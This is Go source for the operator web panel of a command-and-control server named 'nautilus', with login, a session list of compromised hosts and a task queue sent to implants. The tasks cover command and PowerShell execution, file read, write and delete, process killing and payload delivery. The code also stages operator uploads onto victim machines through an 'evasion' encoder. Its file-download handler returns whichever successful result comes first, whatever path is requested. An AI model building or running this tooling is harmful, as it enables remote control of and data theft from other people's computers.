package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"embed"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"nautilus/c2/encode"
	"nautilus/evasion"
)

//go:embed web/index.html
var webUI embed.FS

// Auth config
const (
	authUsername = "nautilus"
	authPassword = "nautilus2026"
	authSecret   = "nautilus_c2_secret_key_2026"
)

// Token storage
type TokenStore struct {
	tokens map[string]time.Time
	mu     sync.Mutex
}

var tokenStore = &TokenStore{tokens: make(map[string]time.Time)}

func generateToken(username string) string {
	h := hmac.New(sha256.New, []byte(authSecret))
	h.Write([]byte(username + time.Now().String()))
	return hex.EncodeToString(h.Sum(nil))
}

func validateToken(token string) bool {
	tokenStore.mu.Lock()
	defer tokenStore.mu.Unlock()
	if exp, ok := tokenStore.tokens[token]; ok {
		if time.Since(exp) < 24*time.Hour {
			return true
		}
		delete(tokenStore.tokens, token)
	}
	return false
}

// WebUI server
type WebUIServer struct {
	server *Server
	mu     sync.Mutex
}

func NewWebUI(s *Server) *WebUIServer {
	return &WebUIServer{server: s}
}

// Auth middleware
func (w *WebUIServer) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(wr http.ResponseWriter, r *http.Request) {
		token := r.Header.Get("Authorization")
		if token == "" {
			token = r.URL.Query().Get("token")
		}
		if token != "" && validateToken(token) {
			next(wr, r)
			return
		}
		http.Error(wr, "unauthorized", http.StatusUnauthorized)
	}
}

// Login API
func (w *WebUIServer) handleLoginAPI(wr http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(wr, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(wr, "invalid json", http.StatusBadRequest)
		return
	}
	if req.Username == authUsername && req.Password == authPassword {
		token := generateToken(req.Username)
		tokenStore.mu.Lock()
		tokenStore.tokens[token] = time.Now()
		tokenStore.mu.Unlock()
		wr.Header().Set("Content-Type", "application/json")
		json.NewEncoder(wr).Encode(map[string]interface{}{
			"status": "ok",
			"token":  token,
		})
		return
	}
	http.Error(wr, "invalid credentials", http.StatusForbidden)
}

func (w *WebUIServer) handleUI(wr http.ResponseWriter, r *http.Request) {
	data, err := webUI.ReadFile("web/index.html")
	if err != nil {
		http.Error(wr, "UI not found", http.StatusInternalServerError)
		return
	}
	wr.Header().Set("Content-Type", "text/html; charset=utf-8")
	wr.Write(data)
}

// Sessions API with heartbeat status
func (w *WebUIServer) handleSessionsAPI(wr http.ResponseWriter, r *http.Request) {
	w.server.mu.Lock()
	defer w.server.mu.Unlock()

	sessions := make([]map[string]interface{}, 0)
	for id, sess := range w.server.sessions {
		active := id == w.server.activeSession
		// Heartbeat status
		status := "active"
		since := time.Since(sess.LastSeen)
		if since > 30*time.Second {
			status = "stale"
		}
		if since > 2*time.Minute {
			status = "dead"
		}
		sessions = append(sessions, map[string]interface{}{
			"id":        id,
			"hostname":  sess.Info["hostname"],
			"username":  sess.Info["username"],
			"os":        sess.Info["os"],
			"ip":        sess.Info["ip"],
			"arch":      sess.Info["arch"],
			"last_seen": sess.LastSeen.Format("2006-01-02 15:04:05"),
			"active":    active,
			"status":    status,
		})
	}
	wr.Header().Set("Content-Type", "application/json")
	json.NewEncoder(wr).Encode(map[string]interface{}{
		"sessions":       sessions,
		"active_session": w.server.activeSession,
	})
}

// Task API
func (w *WebUIServer) handleTaskAPI(wr http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(wr, "POST only", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		SessionID string            `json:"session_id"`
		TaskType  string            `json:"task_type"`
		Params    map[string]string `json:"params"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(wr, "invalid json", http.StatusBadRequest)
		return
	}

	w.server.mu.Lock()
	if req.SessionID == "" {
		req.SessionID = w.server.activeSession
	}
	session, ok := w.server.sessions[req.SessionID]
	if !ok {
		w.server.mu.Unlock()
		http.Error(wr, "session not found", http.StatusNotFound)
		return
	}

	taskTypeMap := map[string]encode.TaskType{
		"exec":      encode.TaskExecCmd,
		"ps":        encode.TaskExecPS,
		"sysinfo":   encode.TaskSysInfo,
		"privinfo":  encode.TaskPrivInfo,
		"listdir":   encode.TaskListDir,
		"proclist":  encode.TaskProcList,
		"kill":      encode.TaskProcKill,
		"filedel":   encode.TaskFileDelete,
		"fileread":  encode.TaskFileRead,
		"filewrite": encode.TaskFileWrite,
		"payload":   encode.TaskPayload,
		"exit":      encode.TaskExit,
	}

	taskTypeCode, ok2 := taskTypeMap[req.TaskType]
	if !ok2 {
		w.server.mu.Unlock()
		http.Error(wr, "unknown task type", http.StatusBadRequest)
		return
	}

	task := &encode.TaskReq{
		TaskType: taskTypeCode,
		Params:   req.Params,
	}
	session.TaskQueue = append(session.TaskQueue, task)
	w.server.mu.Unlock()

	wr.Header().Set("Content-Type", "application/json")
	json.NewEncoder(wr).Encode(map[string]interface{}{
		"status":     "queued",
		"session_id": req.SessionID,
		"task_type":  req.TaskType,
	})
}

// Results API
func (w *WebUIServer) handleResultsAPI(wr http.ResponseWriter, r *http.Request) {
	w.server.mu.Lock()
	defer w.server.mu.Unlock()

	results := make([]map[string]interface{}, 0)
	for id, resp := range w.server.taskResults {
		results = append(results, map[string]interface{}{
			"task_id": id,
			"success": resp.Success,
			"output":  resp.Output,
			"error":   resp.Error,
		})
	}
	wr.Header().Set("Content-Type", "application/json")
	json.NewEncoder(wr).Encode(map[string]interface{}{
		"results": results,
		"count":   len(results),
	})
}

// Use session API
func (w *WebUIServer) handleUseAPI(wr http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(wr, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(wr, "invalid json", http.StatusBadRequest)
		return
	}
	w.server.mu.Lock()
	if _, ok := w.server.sessions[req.SessionID]; ok {
		w.server.activeSession = req.SessionID
		w.server.mu.Unlock()
		wr.Header().Set("Content-Type", "application/json")
		json.NewEncoder(wr).Encode(map[string]interface{}{
			"status":         "ok",
			"active_session": req.SessionID,
		})
	} else {
		w.server.mu.Unlock()
		http.Error(wr, "session not found", http.StatusNotFound)
	}
}

// File download API - 下载目标机器上的文件到操作员浏览器
func (w *WebUIServer) handleFileDownloadAPI(wr http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(wr, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		SessionID string `json:"session_id"`
		Path      string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(wr, "invalid json", http.StatusBadRequest)
		return
	}
	// 查找任务结果中的fileread输出
	w.server.mu.Lock()
	for _, resp := range w.server.taskResults {
		if resp.Success && resp.Output != "" {
			// 返回base64编码的文件内容
			wr.Header().Set("Content-Type", "application/json")
			json.NewEncoder(wr).Encode(map[string]interface{}{
				"status": "ok",
				"data":   resp.Output, // base64编码的文件内容
				"path":   req.Path,
			})
			w.server.mu.Unlock()
			return
		}
	}
	w.server.mu.Unlock()
	http.Error(wr, "file data not found", http.StatusNotFound)
}

// File upload API - 操作员上传文件到服务器暂存
func (w *WebUIServer) handleFileUploadAPI(wr http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(wr, "POST only", http.StatusMethodNotAllowed)
		return
	}

	// Parse multipart form
	err := r.ParseMultipartForm(32 << 20) // 32MB max
	if err != nil {
		http.Error(wr, "parse error", http.StatusBadRequest)
		return
	}

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(wr, "file not found", http.StatusBadRequest)
		return
	}
	defer file.Close()

	sessionID := r.FormValue("session_id")
	targetPath := r.FormValue("target_path")

	// Save to temp directory
	tmpDir := filepath.Join(os.TempDir(), "nautilus_upload")
	os.MkdirAll(tmpDir, 0755)
	tmpPath := filepath.Join(tmpDir, header.Filename)
	data, err := io.ReadAll(file)
	if err != nil {
		http.Error(wr, "read error", http.StatusInternalServerError)
		return
	}
	os.WriteFile(tmpPath, data, 0644)

	// Queue filewrite task to implant
	if sessionID == "" {
		sessionID = w.server.activeSession
	}

	w.server.mu.Lock()
	session, ok := w.server.sessions[sessionID]
	if !ok {
		w.server.mu.Unlock()
		http.Error(wr, "session not found", http.StatusNotFound)
		return
	}

	// 将文件内容base64编码后通过filewrite任务下发
	b64Data := evasion.B64Encode(data)
	task := &encode.TaskReq{
		TaskType: encode.TaskFileWrite,
		Params: map[string]string{
			"path": targetPath,
			"data": b64Data,
		},
	}
	session.TaskQueue = append(session.TaskQueue, task)
	w.server.mu.Unlock()

	wr.Header().Set("Content-Type", "application/json")
	json.NewEncoder(wr).Encode(map[string]interface{}{
		"status":     "queued",
		"session_id": sessionID,
		"filename":   header.Filename,
		"size":       len(data),
	})
}

// suppress unused
var _ = fmt.Sprintf
